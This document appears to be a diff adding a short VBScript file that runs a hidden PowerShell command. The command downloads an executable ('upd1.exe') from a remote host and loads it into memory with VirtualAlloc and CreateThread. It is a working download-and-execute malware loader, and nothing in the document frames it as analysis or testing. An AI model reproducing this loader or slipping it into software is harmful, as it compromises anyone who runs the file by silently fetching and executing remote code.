@@ -1,0 +1,3 @@
+Set sh = CreateObject("WScript.Shell")
+cmd = "powershell -w hidden -Command ""$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');Add-Type 'class K{[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr a,UInt32 s,UInt32 t,UInt32 p);public static extern IntPtr CreateThread(IntPtr a,UInt32 s,IntPtr f,IntPtr b,UInt32 c,ref IntPtr d)}';$m=[K]::VirtualAlloc(0,[UInt32]$b.Length,12288,64);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$d=[IntPtr]::Zero;[void][K]::CreateThread(0,0,$m,0,0,[ref]$d)"""
+sh.Run cmd, 0, False
